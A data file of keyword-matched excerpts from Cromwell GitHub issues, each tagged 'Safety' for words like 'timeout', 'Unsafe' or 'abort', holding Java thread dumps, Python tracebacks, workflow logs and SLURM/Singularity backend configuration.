akka.dispatch.ForkJoinExecutorConfigurator$AkkaForkJoinTask.exec(AbstractDispatcher.scala:415); at scala.concurrent.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260); at scala.concurrent.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339); at scala.concurrent.forkjo",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2228:16394,recover,recoverWith,16394,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2228,1,['recover'],['recoverWith']
Safety,"usr/local/share/google/google-cloud-sdk/lib/googlecloudsdk/core/credentials/gce.py"", line 104, in Project; gce_read.GOOGLE_GCE_METADATA_PROJECT_URI); File ""/usr/local/share/google/google-cloud-sdk/lib/googlecloudsdk/core/util/retry.py"", line 155, in TryFunc; return func(*args, **kwargs), None; File ""/usr/local/share/google/google-cloud-sdk/lib/googlecloudsdk/core/credentials/gce.py"", line 41, in _ReadNoProxyWithCleanFailures; return gce_read.ReadNoProxy(uri); File ""/usr/local/share/google/google-cloud-sdk/lib/googlecloudsdk/core/credentials/gce_read.py"", line 50, in ReadNoProxy; request, timeout=timeout_property).read(); File ""/usr/lib/python2.7/urllib2.py"", line 401, in open; response = self._open(req, data); File ""/usr/lib/python2.7/urllib2.py"", line 419, in _open; '_open', req); File ""/usr/lib/python2.7/urllib2.py"", line 379, in _call_chain; result = func(*args); File ""/usr/lib/python2.7/urllib2.py"", line 1211, in http_open; return self.do_open(httplib.HTTPConnection, req); File ""/usr/lib/python2.7/urllib2.py"", line 1184, in do_open; r = h.getresponse(buffering=True); File ""/usr/lib/python2.7/httplib.py"", line 1072, in getresponse; response.begin(); File ""/usr/lib/python2.7/httplib.py"", line 408, in begin; version, status, reason = self._read_status(); File ""/usr/lib/python2.7/httplib.py"", line 366, in _read_status; line = self.fp.readline(); File ""/usr/lib/python2.7/socket.py"", line 447, in readline; data = self._sock.recv(self._rbufsize); socket.timeout: timed out; :; ```. This is a gsutil stacktrace. JES tried to copy the logs and failed, hence failing the job and the workflow. They might want to retry this - although we've been telling them to stop retrying too much on some things so I don't know. @geoffjentry and @cjllanwarne were talking about it on slack maybe they have an opinion. For call caching: it will get slower and slower. Basically the more jobs you run the slower it's going to be... I'm working on something to fix that but it's not in develop yet.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2228#issuecomment-298751846:3496,timeout,timeout,3496,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2228#issuecomment-298751846,1,['timeout'],['timeout']
Safety,"util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject); at java.util.concurrent.locks.LockSupport.park(LockSupport.java:175); at java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject.await(AbstractQueuedSynchronizer.java:2039); at slick.util.ManagedArrayBlockingQueue$$anonfun$take$1.apply(ManagedArrayBlockingQueue.scala:105); at slick.util.ManagedArrayBlockingQueue.lockedInterruptibly(ManagedArrayBlockingQueue.scala:265); at slick.util.ManagedArrayBlockingQueue.take(ManagedArrayBlockingQueue.scala:104); at java.util.concurrent.ThreadPoolExecutor.getTask(ThreadPoolExecutor.java:1067); at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1127); at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:617); at java.lang.Thread.run(Thread.java:745). ""db-10"" #49 daemon prio=5 os_prio=31 tid=0x00007fb7720cd800 nid=0x8b03 waiting on condition [0x00000001316a4000]; java.lang.Thread.State: WAITING (parking); at sun.misc.Unsafe.park(Native Method); - parking to wait for <0x00000006c0751828> (a java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject); at java.util.concurrent.locks.LockSupport.park(LockSupport.java:175); at java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject.await(AbstractQueuedSynchronizer.java:2039); at slick.util.ManagedArrayBlockingQueue$$anonfun$take$1.apply(ManagedArrayBlockingQueue.scala:105); at slick.util.ManagedArrayBlockingQueue.lockedInterruptibly(ManagedArrayBlockingQueue.scala:265); at slick.util.ManagedArrayBlockingQueue.take(ManagedArrayBlockingQueue.scala:104); at java.util.concurrent.ThreadPoolExecutor.getTask(ThreadPoolExecutor.java:1067); at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1127); at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:617); at java.lang.Thread.run(Thread.java:745). ""db-9"" #48 daemon prio=5 os_prio=31 tid=0x00007fb76b529800 nid=0x8903 waiting on condition [0x000",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/844:28105,Unsafe,Unsafe,28105,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/844,1,['Unsafe'],['Unsafe']
Safety,"util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject); at java.util.concurrent.locks.LockSupport.park(LockSupport.java:175); at java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject.await(AbstractQueuedSynchronizer.java:2039); at slick.util.ManagedArrayBlockingQueue$$anonfun$take$1.apply(ManagedArrayBlockingQueue.scala:105); at slick.util.ManagedArrayBlockingQueue.lockedInterruptibly(ManagedArrayBlockingQueue.scala:265); at slick.util.ManagedArrayBlockingQueue.take(ManagedArrayBlockingQueue.scala:104); at java.util.concurrent.ThreadPoolExecutor.getTask(ThreadPoolExecutor.java:1067); at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1127); at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:617); at java.lang.Thread.run(Thread.java:745). ""db-11"" #50 daemon prio=5 os_prio=31 tid=0x00007fb7720ce800 nid=0x8d03 waiting on condition [0x00000001317a7000]; java.lang.Thread.State: WAITING (parking); at sun.misc.Unsafe.park(Native Method); - parking to wait for <0x00000006c0751828> (a java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject); at java.util.concurrent.locks.LockSupport.park(LockSupport.java:175); at java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject.await(AbstractQueuedSynchronizer.java:2039); at slick.util.ManagedArrayBlockingQueue$$anonfun$take$1.apply(ManagedArrayBlockingQueue.scala:105); at slick.util.ManagedArrayBlockingQueue.lockedInterruptibly(ManagedArrayBlockingQueue.scala:265); at slick.util.ManagedArrayBlockingQueue.take(ManagedArrayBlockingQueue.scala:104); at java.util.concurrent.ThreadPoolExecutor.getTask(ThreadPoolExecutor.java:1067); at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1127); at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:617); at java.lang.Thread.run(Thread.java:745). ""db-10"" #49 daemon prio=5 os_prio=31 tid=0x00007fb7720cd800 nid=0x8b03 waiting on condition [0x00",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/844:27029,Unsafe,Unsafe,27029,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/844,1,['Unsafe'],['Unsafe']
Safety,"util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject); at java.util.concurrent.locks.LockSupport.park(LockSupport.java:175); at java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject.await(AbstractQueuedSynchronizer.java:2039); at slick.util.ManagedArrayBlockingQueue$$anonfun$take$1.apply(ManagedArrayBlockingQueue.scala:105); at slick.util.ManagedArrayBlockingQueue.lockedInterruptibly(ManagedArrayBlockingQueue.scala:265); at slick.util.ManagedArrayBlockingQueue.take(ManagedArrayBlockingQueue.scala:104); at java.util.concurrent.ThreadPoolExecutor.getTask(ThreadPoolExecutor.java:1067); at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1127); at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:617); at java.lang.Thread.run(Thread.java:745). ""db-12"" #51 daemon prio=5 os_prio=31 tid=0x00007fb7720cf000 nid=0x8f03 waiting on condition [0x00000001318aa000]; java.lang.Thread.State: WAITING (parking); at sun.misc.Unsafe.park(Native Method); - parking to wait for <0x00000006c0751828> (a java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject); at java.util.concurrent.locks.LockSupport.park(LockSupport.java:175); at java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject.await(AbstractQueuedSynchronizer.java:2039); at slick.util.ManagedArrayBlockingQueue$$anonfun$take$1.apply(ManagedArrayBlockingQueue.scala:105); at slick.util.ManagedArrayBlockingQueue.lockedInterruptibly(ManagedArrayBlockingQueue.scala:265); at slick.util.ManagedArrayBlockingQueue.take(ManagedArrayBlockingQueue.scala:104); at java.util.concurrent.ThreadPoolExecutor.getTask(ThreadPoolExecutor.java:1067); at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1127); at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:617); at java.lang.Thread.run(Thread.java:745). ""db-11"" #50 daemon prio=5 os_prio=31 tid=0x00007fb7720ce800 nid=0x8d03 waiting on condition [0x00",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/844:25953,Unsafe,Unsafe,25953,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/844,1,['Unsafe'],['Unsafe']
Safety,"util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject); at java.util.concurrent.locks.LockSupport.park(LockSupport.java:175); at java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject.await(AbstractQueuedSynchronizer.java:2039); at slick.util.ManagedArrayBlockingQueue$$anonfun$take$1.apply(ManagedArrayBlockingQueue.scala:105); at slick.util.ManagedArrayBlockingQueue.lockedInterruptibly(ManagedArrayBlockingQueue.scala:265); at slick.util.ManagedArrayBlockingQueue.take(ManagedArrayBlockingQueue.scala:104); at java.util.concurrent.ThreadPoolExecutor.getTask(ThreadPoolExecutor.java:1067); at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1127); at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:617); at java.lang.Thread.run(Thread.java:745). ""db-13"" #52 daemon prio=5 os_prio=31 tid=0x00007fb76e96e000 nid=0x9103 waiting on condition [0x00000001319ad000]; java.lang.Thread.State: WAITING (parking); at sun.misc.Unsafe.park(Native Method); - parking to wait for <0x00000006c0751828> (a java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject); at java.util.concurrent.locks.LockSupport.park(LockSupport.java:175); at java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject.await(AbstractQueuedSynchronizer.java:2039); at slick.util.ManagedArrayBlockingQueue$$anonfun$take$1.apply(ManagedArrayBlockingQueue.scala:105); at slick.util.ManagedArrayBlockingQueue.lockedInterruptibly(ManagedArrayBlockingQueue.scala:265); at slick.util.ManagedArrayBlockingQueue.take(ManagedArrayBlockingQueue.scala:104); at java.util.concurrent.ThreadPoolExecutor.getTask(ThreadPoolExecutor.java:1067); at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1127); at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:617); at java.lang.Thread.run(Thread.java:745). ""db-12"" #51 daemon prio=5 os_prio=31 tid=0x00007fb7720cf000 nid=0x8f03 waiting on condition [0x00",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/844:24877,Unsafe,Unsafe,24877,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/844,1,['Unsafe'],['Unsafe']
Safety,"util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject); at java.util.concurrent.locks.LockSupport.park(LockSupport.java:175); at java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject.await(AbstractQueuedSynchronizer.java:2039); at slick.util.ManagedArrayBlockingQueue$$anonfun$take$1.apply(ManagedArrayBlockingQueue.scala:105); at slick.util.ManagedArrayBlockingQueue.lockedInterruptibly(ManagedArrayBlockingQueue.scala:265); at slick.util.ManagedArrayBlockingQueue.take(ManagedArrayBlockingQueue.scala:104); at java.util.concurrent.ThreadPoolExecutor.getTask(ThreadPoolExecutor.java:1067); at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1127); at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:617); at java.lang.Thread.run(Thread.java:745). ""db-14"" #53 daemon prio=5 os_prio=31 tid=0x00007fb77061e000 nid=0x9303 waiting on condition [0x0000000131ab0000]; java.lang.Thread.State: WAITING (parking); at sun.misc.Unsafe.park(Native Method); - parking to wait for <0x00000006c0751828> (a java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject); at java.util.concurrent.locks.LockSupport.park(LockSupport.java:175); at java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject.await(AbstractQueuedSynchronizer.java:2039); at slick.util.ManagedArrayBlockingQueue$$anonfun$take$1.apply(ManagedArrayBlockingQueue.scala:105); at slick.util.ManagedArrayBlockingQueue.lockedInterruptibly(ManagedArrayBlockingQueue.scala:265); at slick.util.ManagedArrayBlockingQueue.take(ManagedArrayBlockingQueue.scala:104); at java.util.concurrent.ThreadPoolExecutor.getTask(ThreadPoolExecutor.java:1067); at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1127); at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:617); at java.lang.Thread.run(Thread.java:745). ""db-13"" #52 daemon prio=5 os_prio=31 tid=0x00007fb76e96e000 nid=0x9103 waiting on condition [0x00",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/844:23801,Unsafe,Unsafe,23801,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/844,1,['Unsafe'],['Unsafe']
Safety,"util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject); at java.util.concurrent.locks.LockSupport.park(LockSupport.java:175); at java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject.await(AbstractQueuedSynchronizer.java:2039); at slick.util.ManagedArrayBlockingQueue$$anonfun$take$1.apply(ManagedArrayBlockingQueue.scala:105); at slick.util.ManagedArrayBlockingQueue.lockedInterruptibly(ManagedArrayBlockingQueue.scala:265); at slick.util.ManagedArrayBlockingQueue.take(ManagedArrayBlockingQueue.scala:104); at java.util.concurrent.ThreadPoolExecutor.getTask(ThreadPoolExecutor.java:1067); at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1127); at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:617); at java.lang.Thread.run(Thread.java:745). ""db-15"" #54 daemon prio=5 os_prio=31 tid=0x00007fb76b6b4000 nid=0x9503 waiting on condition [0x0000000131bb3000]; java.lang.Thread.State: WAITING (parking); at sun.misc.Unsafe.park(Native Method); - parking to wait for <0x00000006c0751828> (a java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject); at java.util.concurrent.locks.LockSupport.park(LockSupport.java:175); at java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject.await(AbstractQueuedSynchronizer.java:2039); at slick.util.ManagedArrayBlockingQueue$$anonfun$take$1.apply(ManagedArrayBlockingQueue.scala:105); at slick.util.ManagedArrayBlockingQueue.lockedInterruptibly(ManagedArrayBlockingQueue.scala:265); at slick.util.ManagedArrayBlockingQueue.take(ManagedArrayBlockingQueue.scala:104); at java.util.concurrent.ThreadPoolExecutor.getTask(ThreadPoolExecutor.java:1067); at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1127); at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:617); at java.lang.Thread.run(Thread.java:745). ""db-14"" #53 daemon prio=5 os_prio=31 tid=0x00007fb77061e000 nid=0x9303 waiting on condition [0x00",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/844:22725,Unsafe,Unsafe,22725,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/844,1,['Unsafe'],['Unsafe']
Safety,"util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject); at java.util.concurrent.locks.LockSupport.park(LockSupport.java:175); at java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject.await(AbstractQueuedSynchronizer.java:2039); at slick.util.ManagedArrayBlockingQueue$$anonfun$take$1.apply(ManagedArrayBlockingQueue.scala:105); at slick.util.ManagedArrayBlockingQueue.lockedInterruptibly(ManagedArrayBlockingQueue.scala:265); at slick.util.ManagedArrayBlockingQueue.take(ManagedArrayBlockingQueue.scala:104); at java.util.concurrent.ThreadPoolExecutor.getTask(ThreadPoolExecutor.java:1067); at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1127); at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:617); at java.lang.Thread.run(Thread.java:745). ""db-16"" #55 daemon prio=5 os_prio=31 tid=0x00007fb76e92f000 nid=0x9703 waiting on condition [0x0000000131cb6000]; java.lang.Thread.State: WAITING (parking); at sun.misc.Unsafe.park(Native Method); - parking to wait for <0x00000006c0751828> (a java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject); at java.util.concurrent.locks.LockSupport.park(LockSupport.java:175); at java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject.await(AbstractQueuedSynchronizer.java:2039); at slick.util.ManagedArrayBlockingQueue$$anonfun$take$1.apply(ManagedArrayBlockingQueue.scala:105); at slick.util.ManagedArrayBlockingQueue.lockedInterruptibly(ManagedArrayBlockingQueue.scala:265); at slick.util.ManagedArrayBlockingQueue.take(ManagedArrayBlockingQueue.scala:104); at java.util.concurrent.ThreadPoolExecutor.getTask(ThreadPoolExecutor.java:1067); at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1127); at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:617); at java.lang.Thread.run(Thread.java:745). ""db-15"" #54 daemon prio=5 os_prio=31 tid=0x00007fb76b6b4000 nid=0x9503 waiting on condition [0x00",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/844:21649,Unsafe,Unsafe,21649,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/844,1,['Unsafe'],['Unsafe']
Safety,"util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject); at java.util.concurrent.locks.LockSupport.park(LockSupport.java:175); at java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject.await(AbstractQueuedSynchronizer.java:2039); at slick.util.ManagedArrayBlockingQueue$$anonfun$take$1.apply(ManagedArrayBlockingQueue.scala:105); at slick.util.ManagedArrayBlockingQueue.lockedInterruptibly(ManagedArrayBlockingQueue.scala:265); at slick.util.ManagedArrayBlockingQueue.take(ManagedArrayBlockingQueue.scala:104); at java.util.concurrent.ThreadPoolExecutor.getTask(ThreadPoolExecutor.java:1067); at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1127); at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:617); at java.lang.Thread.run(Thread.java:745). ""db-18"" #58 daemon prio=5 os_prio=31 tid=0x00007fb770630800 nid=0x9d03 waiting on condition [0x00000001323d9000]; java.lang.Thread.State: WAITING (parking); at sun.misc.Unsafe.park(Native Method); - parking to wait for <0x00000006c0751828> (a java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject); at java.util.concurrent.locks.LockSupport.park(LockSupport.java:175); at java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject.await(AbstractQueuedSynchronizer.java:2039); at slick.util.ManagedArrayBlockingQueue$$anonfun$take$1.apply(ManagedArrayBlockingQueue.scala:105); at slick.util.ManagedArrayBlockingQueue.lockedInterruptibly(ManagedArrayBlockingQueue.scala:265); at slick.util.ManagedArrayBlockingQueue.take(ManagedArrayBlockingQueue.scala:104); at java.util.concurrent.ThreadPoolExecutor.getTask(ThreadPoolExecutor.java:1067); at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1127); at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:617); at java.lang.Thread.run(Thread.java:745). ""pool-1-thread-3"" #57 prio=5 os_prio=31 tid=0x00007fb76e95e000 nid=0x9b03 waiting on condition [0",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/844:18619,Unsafe,Unsafe,18619,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/844,1,['Unsafe'],['Unsafe']
Safety,"ution time. But then it is redundant. This command can be part of the submit script. . Thanks @TMiguelT for suggesting flock. Together with `singularity exec` I think it can solve this particular use case. The `SINGULARITY_CACHEDIR` environment variable needs to be set to a location on the cluster. Then the following config can work:. ```; SLURM {; actor-factory = ""cromwell.backend.impl.sfs.config.ConfigBackendLifecycleActorFactory""; config {; concurrent-job-limit = 200; exit-code-timeout-seconds = 120; # 4G Memory by default; runtime-attributes= """"""; Int cpu = 1; Int? memory; String? docker; Int time_minutes = 120; """"""; submit-docker = """"""; # Singularity pull image. ; if [ -z $SINGULARITY_CACHEDIR ]; ; then CACHE_DIR=$HOME/singularity/cache; else CACHE_DIR=$SINGULARITY_CACHEDIR; fi; mkdir -p $CACHE_DIR; LOCK_FILE=$CACHE_DIR/singularity_pull_flock; # flock should work as this is executed at the same node as cromwell.; flock --verbose --exclusive --timeout 900 $LOCK_FILE singularity exec --containall docker://${docker} echo ""succesfully pulled ${docker}!"". # Partition selection; PARTITION=all; MEMORY=${default=""4294967296"" memory}; if [ ${time_minutes} -lt 60 ]; then PARTITION=short; fi; if [ $MEMORY -gt 107374182400 ] ; then PARTITION=highmem ; fi. # Job submission; sbatch \; --partition=$PARTITION \; --job-name=""${job_name}"" \; --chdir=""${cwd}"" \; --time=""${time_minutes}"" \; --cpus-per-task=""${cpu}"" \; --mem=$(echo ""$MEMORY / 1024^2"" | bc) \; --output=""${out}"" \; --error=""${err}"" \; --wrap \; 'singularity exec --containall --bind /shared_cluster_dir,${cwd}:${docker_cwd} docker://${docker} sh ${script}; rc=$?; if [ ! -f ${cwd}/execution/rc ]; then; echo ""$rc"" > ${cwd}/execution/rc; fi'; """"""; kill = ""scancel ${job_id}""; kill-docker = ""scancel ${job_id}""; check-alive = ""squeue -j ${job_id}""; job-id-regex = ""Submitted batch job (\\d+).*""; ``` . EDIT: I changed the config. Instead of using multiple locks (one lock per image) there is now one universal lock. This is becau",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5063#issuecomment-627379430:1405,timeout,timeout,1405,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5063#issuecomment-627379430,1,['timeout'],['timeout']
Safety,"via REST API end points. However, we are working on HPC cluster where we don't have admin privileges to start server and submit requests to api. Backend: `slurm`; Workflow: [Link](https://github.com/biowdl/RNA-seq/blob/develop/RNA-seq.wdl). <details>; <summary>Config</summary>. ```; backend {. default = slurm. providers {; slurm {; actor-factory = ""cromwell.backend.impl.sfs.config.ConfigBackendLifecycleActorFactory""; config {; runtime-attributes = """"""; Int time_minutes = 600; Int cpu = 4; #Int memory = 500; String queue = ""short""; String map_path = ""/shared/rna-seq""; String partition = ""compute""; String root = ""/shared/rna-seq/cromwell-executions""; """""". # If an 'exit-code-timeout-seconds' value is specified:; # - check-alive will be run at this interval for every job; # - if a job is found to be not alive, and no RC file appears after this interval; # - Then it will be marked as Failed.; # Warning: If set, Cromwell will run 'check-alive' for every job at this interval. # exit-code-timeout-seconds = 120. submit = """"""; task=`echo ${job_name}|cut -d'_' -f3`; echo $task; image=`grep ""\b$task\b"" ${map_path}/map.txt |cut -d',' -f2`; echo $PWD; echo $image; if [ ! -z $image ]; then \; echo ""Inside Singularity exec""; \; echo ""CPU count: "" ${cpu}; \; echo ""time_minutes: "" ${time_minutes}; \; sbatch -J ${job_name} -D ${cwd} -c ${cpu} -o ${out} -e ${err} -t ${time_minutes} --wrap ""singularity exec -B /shared/rna-seq:/shared/rna-seq $image /bin/bash ${script}""; else \; echo ""No Singularity""; \; sbatch -J ${job_name} -D ${cwd} -c ${cpu} -o ${out} -e ${err} -t ${time_minutes} --wrap ""/bin/bash ${script}""; fi;; """"""; kill = ""scancel ${job_id}""; check-alive = ""squeue -j ${job_id}""; job-id-regex = ""Submitted batch job (\\d+).*""; }; }; }; }; ```. </details>. <details>; <summary>Error stack trace</summary>. ```; [2021-03-08 11:53:28,10] [ESC[38;5;1merrorESC[0m] Failed to instantiate Cromwell System. Shutting down Cromwell.; java.sql.SQLTransientConnectionException: db - Connection is no",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6208:1642,timeout,timeout-seconds,1642,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6208,1,['timeout'],['timeout-seconds']
Safety,"w slots exist; #max-workflow-launch-count = 50. # Number of seconds between workflow launches; #new-workflow-poll-rate = 20. # Since the WorkflowLogCopyRouter is initialized in code, this is the number of workers; #number-of-workflow-log-copy-workers = 10. # Default number of cache read workers; #number-of-cache-read-workers = 25. io {; # throttle {; # # Global Throttling - This is mostly useful for GCS and can be adjusted to match; # # the quota availble on the GCS API; # #number-of-requests = 100000; # #per = 100 seconds; # }. # Number of times an I/O operation should be attempted before giving up and failing it.; #number-of-attempts = 5; }. # Maximum number of input file bytes allowed in order to read each type.; # If exceeded a FileSizeTooBig exception will be thrown.; input-read-limits {; #lines = 128000; #bool = 7; #int = 19; #float = 50; #string = 128000; #json = 128000; #tsv = 128000; #map = 128000; #object = 128000; }. abort {; # These are the default values in Cromwell, in most circumstances there should not be a need to change them. # How frequently Cromwell should scan for aborts.; scan-frequency: 30 seconds. # The cache of in-progress aborts. Cromwell will add entries to this cache once a WorkflowActor has been messaged to abort.; # If on the next scan an 'Aborting' status is found for a workflow that has an entry in this cache, Cromwell will not ask; # the associated WorkflowActor to abort again.; cache {; enabled: true; # Guava cache concurrency.; concurrency: 1; # How long entries in the cache should live from the time they are added to the cache.; ttl: 20 minutes; # Maximum number of entries in the cache.; size: 100000; }; }. # Cromwell reads this value into the JVM's `networkaddress.cache.ttl` setting to control DNS cache expiration; dns-cache-ttl: 3 minutes; }. docker {; hash-lookup {; # Set this to match your available quota against the Google Container Engine API; #gcr-api-queries-per-100-seconds = 1000. # Time in minutes before an entry expires",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6933:3119,abort,abort,3119,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6933,1,['abort'],['abort']
Safety,"wExecutionActor-aed1aad8-588d-4f84-aa09-da0f663d68c0 [UUID(aed1aad8)]: Starting calls: printHelloAndGoodbye.echoHelloWorld:NA:1; 2016-09-09 15:50:58,138 cromwell-system-akka.dispatchers.engine-dispatcher-22 INFO - EJEA_aed1aad8:printHelloAndGoodbye.echoHelloWorld:-1:1: Effective call caching mode: CallCachingOff; 2016-09-09 15:50:58,139 cromwell-system-akka.dispatchers.engine-dispatcher-20 INFO - WorkflowExecutionActor-aed1aad8-588d-4f84-aa09-da0f663d68c0 [UUID(aed1aad8)]: WorkflowExecutionActor [UUID(aed1aad8)] transitioning from WorkflowExecutionPendingState to WorkflowExecutionInProgressState.; 2016-09-09 15:51:00,401 cromwell-system-akka.dispatchers.engine-dispatcher-22 INFO - WorkflowActor-aed1aad8-588d-4f84-aa09-da0f663d68c0 [UUID(aed1aad8)]: transitioning from ExecutingWorkflowState to WorkflowAbortingState; 2016-09-09 15:51:00,401 cromwell-system-akka.dispatchers.engine-dispatcher-20 INFO - WorkflowExecutionActor [UUID(aed1aad8)]: Abort received. Aborting 1 EJEAs; 2016-09-09 15:51:00,402 cromwell-system-akka.dispatchers.engine-dispatcher-20 INFO - WorkflowExecutionActor-aed1aad8-588d-4f84-aa09-da0f663d68c0 [UUID(aed1aad8)]: WorkflowExecutionActor [UUID(aed1aad8)] transitioning from WorkflowExecutionInProgressState to WorkflowExecutionAbortingState.; 2016-09-09 15:51:00,416 cromwell-system-akka.dispatchers.backend-dispatcher-29 ERROR - Unexpected message KvKeyLookupFailed(KvGet(ScopedKey(aed1aad8-588d-4f84-aa09-da0f663d68c0,KvJobKey(printHelloAndGoodbye.echoHelloWorld,None,1),__jes_operation_id))).; 2016-09-09 15:51:01,316 INFO - JesRun [UUID(aed1aad8)printHelloAndGoodbye.echoHelloWorld:NA:1]: JES Run ID is operations/EI6qg4TxKhid_JjDtaqaiegBINHtgZmgHSoPcHJvZHVjdGlvblF1ZXVl; 2016-09-09 15:51:01,532 cromwell-system-akka.dispatchers.backend-dispatcher-29 INFO - $a [UUID(aed1aad8)printHelloAndGoodbye.echoHelloWorld:NA:1]: JesAsyncBackendJobExecutionActor [UUID(aed1aad8):printHelloAndGoodbye.echoHelloWorld:NA:1] Status change from - to Initializing; 2016-09-09 15",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1253#issuecomment-246048733:4306,Abort,Aborting,4306,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1253#issuecomment-246048733,1,['Abort'],['Aborting']
